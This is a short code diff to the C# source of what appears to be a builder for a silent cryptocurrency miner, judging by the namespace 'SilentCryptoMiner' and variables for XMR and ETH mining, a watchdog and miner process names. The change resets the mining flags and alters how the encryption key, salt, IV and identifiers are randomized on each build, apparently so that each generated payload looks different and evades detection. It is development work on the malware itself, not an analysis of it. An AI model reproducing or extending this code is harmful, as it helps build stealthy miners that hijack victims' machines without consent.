@@ -93,11 +93,16 @@ namespace SilentCryptoMiner
                 Invoke(new Action(() => txtLog.ResetText()));
                 BuildLog("Starting...");
                 BuildLog("Randomizing keys...");
+
                 xmrGPU = false;
-                AESKEY = RandomString(256);
-                SALT = RandomString(32);
-                IV = RandomString(16);
-                KEY = RandomString(32);
+                fullnids = new List<string>();
+                mineETH = false;
+                mineXMR = false;
+
+                AESKEY = Randomi(256);
+                SALT = Randomi(32);
+                IV = Randomi(16);
+                KEY = Randomi(32);
                 minerFind = Randomi(rand.Next(8, 16));
                 watchdogID = Randomi(rand.Next(8, 16));
 
